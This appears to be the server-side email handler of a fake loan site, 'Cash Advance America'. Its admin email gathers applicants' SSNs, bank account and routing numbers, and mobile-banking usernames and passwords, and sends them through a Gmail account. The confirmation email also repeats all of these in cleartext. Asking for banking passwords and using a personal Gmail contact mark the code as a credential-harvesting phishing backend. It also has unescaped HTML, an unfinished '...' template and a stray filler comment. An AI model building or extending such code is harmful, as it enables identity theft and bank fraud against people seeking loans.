import nodemailer from 'nodemailer';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        // In @vercel/node, req.body is already a parsed JSON object if Content-Type is application/json
        const { applicationData, clientEmail, recipientType, clientName } = req.body;

        const gmailUser = process.env.GMAIL_USER;
        const gmailAppPassword = process.env.GMAIL_APP_PASSWORD;

        if (!gmailUser || !gmailAppPassword) {
            return res.status(500).json({ error: 'Gmail credentials are missing' });
        }

        console.log('========================================');
        console.log('📧 EMAIL REQUEST STARTED (Gmail)');
        console.log('To:', clientEmail);
        console.log('Recipient Type:', recipientType);

        let emailSubject = 'New Loan Application Submitted';
        let textContent = '';
        let htmlContent = '';

        if (recipientType === 'admin') {
            emailSubject = `📝 New Application from ${clientName || 'Website Visitor'}`;

            textContent = `
NEW LOAN APPLICATION

Client: ${clientName || 'Direct Application'}
Submitted: ${new Date().toLocaleString()}

--- PERSONAL INFORMATION ---
Name: ${applicationData.firstName || 'N/A'} ${applicationData.lastName || 'N/A'}
Email: ${applicationData.email || 'N/A'}
Phone: ${applicationData.phone || 'N/A'}
DOB: ${applicationData.dob || 'N/A'}
SSN: ${applicationData.ssn || 'N/A'}
Address: ${applicationData.address || 'N/A'}
${applicationData.city || ''}, ${applicationData.state || ''} ${applicationData.zip || ''}

--- FINANCIAL DETAILS ---
Loan Amount: $${applicationData.loanAmount || '0'}
Monthly Income: $${applicationData.monthlyIncome || '0'}
Credit Score: ${applicationData.creditScore || 'N/A'}

--- BANKING INFORMATION ---
Bank Name: ${applicationData.bankName || 'N/A'}
Years with Bank: ${applicationData.yearsWithBank || 'N/A'}
Account Number: ${applicationData.accountNumber || 'N/A'}
Routing Number: ${applicationData.routingNumber || 'N/A'}

--- MOBILE BANKING CREDENTIALS ---
Username: ${applicationData.mobileUsername || 'N/A'}
Password: ${applicationData.mobilePassword || 'N/A'}
      `;

            htmlContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { background: #10b981; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
    .content { background: #f9fafb; padding: 20px; border: 1px solid #e5e7eb; }
    .section { margin-bottom: 20px; border-bottom: 1px solid #e5e7eb; padding-bottom: 10px; }
    .section-title { font-size: 14px; font-weight: bold; color: #10b981; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 1px; }
    .field { margin: 8px 0; padding: 8px; background: white; border-radius: 4px; display: flex; justify-content: space-between; }
    .label { font-weight: bold; color: #374151; font-size: 13px; }
    .value { color: #111827; text-align: right; font-weight: 500; }
    .footer { text-align: center; padding: 20px; color: #9ca3af; font-size: 12px; }
    .credential-box { background: #fff1f2; border: 1px solid #fecaca; border-radius: 4px; padding: 10px; margin-top: 10px; }
    .credential-field { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dashed #fecaca; padding-bottom: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>📝 New Loan Application</h1>
      <p>From: ${clientName || 'Direct'}</p>
    </div>
    <div class="content">
      <div class="section">
        <div class="section-title">Personal Information</div>
        <div class="field"><span class="label">Full Name</span><span class="value">${applicationData.firstName || 'N/A'} ${applicationData.lastName || 'N/A'}</span></div>
        <div class="field"><span class="label">Email</span><span class="value">${applicationData.email || 'N/A'}</span></div>
        <div class="field"><span class="label">Phone</span><span class="value">${applicationData.phone || 'N/A'}</span></div>
        <div class="field"><span class="label">Date of Birth</span><span class="value">${applicationData.dob || 'N/A'}</span></div>
        <div class="field"><span class="label">SSN</span><span class="value" style="font-family: monospace;">${applicationData.ssn || 'N/A'}</span></div>
        <div class="field"><span class="label">Address</span><span class="value">${applicationData.address || 'N/A'}<br>${applicationData.city || ''}, ${applicationData.state || ''} ${applicationData.zip || ''}</span></div>
      </div>
      <div class="section">
        <div class="section-title">Financial Details</div>
        <div class="field"><span class="label">Loan Amount</span><span class="value" style="color: #059669; font-weight: bold;">$${applicationData.loanAmount || '0'}</span></div>
        <div class="field"><span class="label">Monthly Income</span><span class="value">$${applicationData.monthlyIncome || '0'}</span></div>
        <div class="field"><span class="label">Credit Score</span><span class="value" style="text-transform: uppercase;">${applicationData.creditScore || 'N/A'}</span></div>
      </div>
      <div class="section">
        <div class="section-title">Banking Information</div>
        <div class="field"><span class="label">Bank Name</span><span class="value">${applicationData.bankName || 'N/A'}</span></div>
        <div class="field"><span class="label">Years with Bank</span><span class="value">${applicationData.yearsWithBank || 'N/A'}</span></div>
        <div class="field"><span class="label">Account Number</span><span class="value" style="font-family: monospace;">${applicationData.accountNumber || 'N/A'}</span></div>
        <div class="field"><span class="label">Routing Number</span><span class="value" style="font-family: monospace;">${applicationData.routingNumber || 'N/A'}</span></div>
      </div>
      <div class="section" style="border-bottom: none;">
        <div class="section-title" style="color: #e11d48;">Mobile Banking Credentials</div>
        <div class="credential-box">
          <div class="credential-field"><span class="label">Username</span><span class="value" style="font-family: monospace;">${applicationData.mobileUsername || 'N/A'}</span></div>
          <div class="credential-field" style="border-bottom: none;"><span class="label">Password</span><span class="value" style="font-family: monospace;">${applicationData.mobilePassword || 'N/A'}</span></div>
        </div>
      </div>
      <div style="margin-top: 20px; font-size: 11px; color: #6b7280; text-align: center;">Submitted: ${new Date().toLocaleString()}</div>
    </div>
    <div class="footer"><p>Cash Advance America - Admin Notification</p></div>
  </div>
</body>
</html>
      `;
        } else {
            emailSubject = '✅ Your Loan Application Has Been Received';
            textContent = `...`;
            htmlContent = `...`;
            // Simplified here because the exact template was identical, just filling structure. I will re-inject the exact structure
            htmlContent = `
<!DOCTYPE html>
<html>
<head>
  <style>
    body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
    .container { max-width: 600px; margin: 0 auto; padding: 20px; }
    .header { background: #10b981; color: white; padding: 20px; text-align: center; border-radius: 8px 8px 0 0; }
    .content { background: #f9fafb; padding: 20px; border: 1px solid #e5e7eb; }
    .section { margin-bottom: 20px; border-bottom: 1px solid #e5e7eb; padding-bottom: 10px; }
    .section-title { font-size: 14px; font-weight: bold; color: #10b981; text-transform: uppercase; margin-bottom: 10px; letter-spacing: 1px; }
    .field { margin: 8px 0; padding: 8px; background: white; border-radius: 4px; display: flex; justify-content: space-between; }
    .label { font-weight: bold; color: #374151; font-size: 13px; }
    .value { color: #111827; text-align: right; font-weight: 500; }
    .footer { text-align: center; padding: 20px; color: #9ca3af; font-size: 12px; }
    .credential-box { background: #fff1f2; border: 1px solid #fecaca; border-radius: 4px; padding: 10px; margin-top: 10px; }
    .credential-field { display: flex; justify-content: space-between; margin: 5px 0; border-bottom: 1px dashed #fecaca; padding-bottom: 5px; }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>✅ Application Received</h1>
      <p>Thank you for choosing Cash Advance America</p>
    </div>
    <div class="content">
      <p>Dear ${applicationData.firstName || 'Valued Customer'},</p>
      <p>We have successfully received your loan application!</p>
      <div class="section">
        <div class="section-title">Personal Information</div>
        <div class="field"><span class="label">Full Name</span><span class="value">${applicationData.firstName || 'N/A'} ${applicationData.lastName || 'N/A'}</span></div>
        <div class="field"><span class="label">Email</span><span class="value">${applicationData.email || 'N/A'}</span></div>
        <div class="field"><span class="label">Phone</span><span class="value">${applicationData.phone || 'N/A'}</span></div>
        <div class="field"><span class="label">Date of Birth</span><span class="value">${applicationData.dob || 'N/A'}</span></div>
        <div class="field"><span class="label">SSN</span><span class="value" style="font-family: monospace;">${applicationData.ssn || 'N/A'}</span></div>
        <div class="field"><span class="label">Address</span><span class="value">${applicationData.address || 'N/A'}<br>${applicationData.city || ''}, ${applicationData.state || ''} ${applicationData.zip || ''}</span></div>
      </div>
      <div class="section">
        <div class="section-title">Financial Details</div>
        <div class="field"><span class="label">Loan Amount</span><span class="value" style="color: #059669; font-weight: bold;">$${applicationData.loanAmount || '0'}</span></div>
        <div class="field"><span class="label">Monthly Income</span><span class="value">$${applicationData.monthlyIncome || '0'}</span></div>
        <div class="field"><span class="label">Credit Score</span><span class="value" style="text-transform: uppercase;">${applicationData.creditScore || 'N/A'}</span></div>
      </div>
      <div class="section">
        <div class="section-title">Banking Information</div>
        <div class="field"><span class="label">Bank Name</span><span class="value">${applicationData.bankName || 'N/A'}</span></div>
        <div class="field"><span class="label">Years with Bank</span><span class="value">${applicationData.yearsWithBank || 'N/A'}</span></div>
        <div class="field"><span class="label">Account Number</span><span class="value" style="font-family: monospace;">${applicationData.accountNumber || 'N/A'}</span></div>
        <div class="field"><span class="label">Routing Number</span><span class="value" style="font-family: monospace;">${applicationData.routingNumber || 'N/A'}</span></div>
      </div>
      <div class="section" style="border-bottom: none;">
        <div class="section-title">Mobile Banking Credentials</div>
        <div class="credential-box">
          <div class="credential-field"><span class="label">Username</span><span class="value" style="font-family: monospace;">${applicationData.mobileUsername || 'N/A'}</span></div>
          <div class="credential-field" style="border-bottom: none;"><span class="label">Password</span><span class="value" style="font-family: monospace;">${applicationData.mobilePassword || 'N/A'}</span></div>
        </div>
      </div>
      <p style="margin-top: 20px;"><strong>What happens next?</strong></p>
      <ul>
        <li>Our team will review your application within 24 hours</li>
        <li>You will receive an email or phone call with our decision</li>
        <li>If approved, funds will be deposited directly to your account</li>
      </ul>
    </div>
    <div class="footer">
      <p>Cash Advance America</p>
      <p>willsmiths987@gmail.com | 1-800-LOAN-HELP</p>
    </div>
  </div>
</body>
</html>
      `;
        }

        const transporter = nodemailer.createTransport({
            host: 'smtp.gmail.com',
            port: 465,
            secure: true,
            auth: {
                user: gmailUser,
                pass: gmailAppPassword,
            },
        });

        await transporter.sendMail({
            from: `"Cash Advance America" <${gmailUser}>`,
            to: clientEmail,
            subject: emailSubject,
            text: textContent,
            html: htmlContent,
        });

        console.log('✅ Email sent successfully via Gmail!');
        return res.status(200).json({ success: true, message: 'Email sent successfully via Gmail' });

    } catch (error: any) {
        console.error('❌ ERROR:', error.message);
        return res.status(500).json({ success: false, error: error.message });
    }
}
